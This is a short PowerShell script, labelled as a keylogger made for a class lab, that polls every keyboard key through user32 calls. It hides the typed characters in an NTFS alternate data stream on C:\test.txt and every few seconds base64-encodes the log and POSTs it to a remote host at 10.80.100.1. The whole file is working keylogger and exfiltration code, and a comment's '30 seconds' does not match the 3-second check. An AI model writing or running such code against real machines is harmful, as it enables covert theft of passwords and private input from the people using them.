# Keylogger created for a class lab

function Keylog($ip, $ADS) {
    Add-Content -Path $ADS -Value 'Start' -Stream 'Log'
    # Functions to import
    $imported_functions = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); 
    [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int GetKeyboardState(byte[] keystate);
    [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int MapVirtualKey(uint uCode, int uMapType);
    [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
    # the imported functions
    $if = Add-Type -MemberDefinition $imported_functions -Name 'Win32' -Namespace API -PassThru
    
    try {
        Write-Host "[+] Started" -ForegroundColor Blue
        
        $timer = [Diagnostics.Stopwatch]::StartNew()
        while($true) {
            Start-Sleep -Milliseconds 50
            # Loop through all the ascii keys
            for($i = 9; $i -lt 255; $i++) {
                # Get the state of each key
                $state = $if::GetAsyncKeyState($i)
                # Check if it is pressed
                if($state -eq -32767) {
                    
                    [console]::CapsLock | Out-Null

                    $key = $if::MapVirtualKey($i, 3)

                    $bytes = New-Object Byte[] 256
                    $bytes_state = $if::GetKeyboardState($bytes)

                    $char = New-Object -TypeName System.Text.StringBuilder

                    $result = $if::ToUnicode($i, $key, $bytes, $char, $char.Capacity, 0)

                    if($result) {
                        Add-Content -Path $ADS -Value $char -Stream 'Log' -NoNewline
                    }
                }
            }
            # Check if the stopwatch has stuck 30 seconds
            if($timer.Elapsed.Seconds -ge 3) {
                $content = Get-Content -Path $ADS -Stream 'Log'
                $content_bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
                $base64content = [System.Convert]::ToBase64String($content_bytes)
                try {
                    Invoke-WebRequest -Uri "http://$ip/" -Method POST -Body $base64content
                    Write-Host "[+] Sent" -ForegroundColor Green
                    Add-Content -Path $ADS -Value '' -Stream 'Log'
                }
                catch {}
                $timer = [Diagnostics.Stopwatch]::StartNew()
            }
        }
    }
    catch {}
}

Keylog "10.80.100.1" -ADS "C:\test.txt"
